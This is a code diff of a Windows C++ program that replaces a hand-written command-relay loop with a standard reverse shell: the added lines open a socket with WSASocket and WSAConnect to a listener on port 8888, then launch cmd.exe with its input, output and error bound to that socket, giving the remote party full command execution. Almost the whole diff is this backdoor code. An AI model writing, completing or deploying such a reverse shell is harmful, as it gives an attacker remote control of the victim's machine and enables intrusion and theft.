@@ -17,6 +17,8 @@ int main(int argc , char *argv[])
     int recvbuflen = 4096;
     std::string res;
     std::string recvbuf1;
+    STARTUPINFO sui;
+    PROCESS_INFORMATION pi;
  
     printf("\nInitialising Winsock...");
     if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
@@ -28,7 +30,7 @@ int main(int argc , char *argv[])
     printf("Initialised.\n");
     
 
-    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
+    if((s = WSASocket(AF_INET , SOCK_STREAM , IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET)
     {
         printf("Could not create socket : %d" , WSAGetLastError());
     }
@@ -40,35 +42,22 @@ int main(int argc , char *argv[])
     server.sin_family = AF_INET;
     server.sin_port = htons( 8888 );
 
-    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
+    if (WSAConnect(s , (struct sockaddr *)&server , sizeof(server), NULL, NULL, NULL, NULL) < 0)
     {
         puts("connect error");
         return 1;
-    } 
-    puts("Connected");
-    while (true)
-    {
-        std::string dir = obtain_directory();
-        if (send(s,dir.c_str(),dir.size(),0) == SOCKET_ERROR) {
-            printf("Error en send: %d\n", WSAGetLastError());
-            break;
-        }
-        ssize_t result = recv(s, recvbuf, recvbuflen, 0);
-		if (result > 0) {
-			recvbuf[result] = '\0'; // Asegura que sea una cadena válida
-			res = executeCommand(recvbuf);
-            if (send(s,res.data(),res.size(),0) == SOCKET_ERROR) {
-                printf("Error en send: %d\n", WSAGetLastError());
-                break;
-            }
-		} else {
-			puts("Connection Error");
-		}
-
-    }
+    } puts("Connected");
+    
+    memset(&sui, 0, sizeof(sui));
+    sui.cb = sizeof(sui);
+    sui.dwFlags = STARTF_USESTDHANDLES;
+    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s;
+    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    WSACleanup();
     
     
     
  
-    return 0;
+    exit(0);
 }
